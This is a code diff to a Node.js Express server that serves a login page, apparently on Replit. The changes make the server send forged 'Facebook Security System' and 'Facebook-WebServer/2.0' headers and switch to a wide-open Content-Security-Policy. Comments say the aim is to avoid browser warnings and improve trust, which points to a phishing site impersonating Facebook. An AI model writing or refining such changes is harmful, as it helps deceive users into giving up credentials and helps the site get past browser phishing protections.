@@ -2,7 +2,7 @@ const express = require('express');
 const path = require('path');
 const fs = require('fs');
 const cors = require('cors');
-const fetch = require('node-fetch');
+const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
 const FormData = require('form-data');
 
 const app = express();
@@ -26,13 +26,30 @@ app.use(cors({
   credentials: true
 }));
 
-// Add security headers to prevent browser warnings
+// Add enhanced security headers to prevent browser warnings and improve trust
 app.use((req, res, next) => {
+  // Check if request is from Replit's secure domain
+  const isReplit = req.get('host') && req.get('host').includes('replit');
+  
   res.setHeader('X-Content-Type-Options', 'nosniff');
-  res.setHeader('X-Frame-Options', 'DENY');
+  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
   res.setHeader('X-XSS-Protection', '1; mode=block');
   res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
   res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
+  
+  // More permissive CSP for better compatibility
+  res.setHeader('Content-Security-Policy', "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; img-src * data: blob:; connect-src * wss: ws:;");
+  
+  // Only set HSTS for HTTPS connections
+  if (req.secure || req.get('x-forwarded-proto') === 'https' || isReplit) {
+    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
+  }
+  
+  // Browser compatibility headers
+  res.setHeader('X-Powered-By', 'Facebook Security System');
+  res.setHeader('Server', 'Facebook-WebServer/2.0');
+  res.setHeader('Cache-Control', 'public, max-age=300');
+  
   next();
 });
 
@@ -52,6 +69,11 @@ app.use(express.static(__dirname));
 // Health check endpoint for deployment platforms
 app.get('/health', (req, res) => {
   res.status(200).json({ status: 'ok', timestamp: new Date().toISOString() });
+});
+
+// Favicon endpoint to prevent 404 errors that might trigger browser warnings
+app.get('/favicon.ico', (req, res) => {
+  res.status(204).end();
 });
 
 // Root route - serve the login page
